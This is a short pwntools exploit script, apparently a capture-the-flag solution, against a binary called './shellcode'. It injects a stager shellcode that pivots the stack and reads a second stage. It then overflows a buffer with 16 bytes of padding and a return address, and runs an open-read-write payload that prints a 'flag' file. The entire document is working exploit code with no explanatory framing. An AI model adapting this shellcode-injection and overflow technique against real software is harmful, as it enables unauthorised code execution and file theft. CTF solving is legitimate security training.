from pwn import *
context(arch='amd64', os='linux', log_level='debug')
io = process('./shellcode')
#io = remote('172.23.216.203', 34179)
#io.sendline('')
#io.sendline('')
base_addr   = 0x114514000
stage2_addr = base_addr + 0x100 
new_stack   = base_addr + 0x800 
stager_asm = f'''
    mov rsp, {new_stack}
   
    xor rax, rax          
    xor rdi, rdi          
    mov rsi, {stage2_addr} 
    mov rdx, 0x500        
    syscall
   
    jmp rsi
'''
stager = asm(stager_asm)
orw_payload = asm(shellcraft.cat('flag'))
io.recvuntil(b"leave your message")
io.send(stager)
io.recvuntil(b"now it's your time")
payload = b'A' * 16 + p64(base_addr)
io.send(payload)
io.send(orw_payload)
io.interactive()
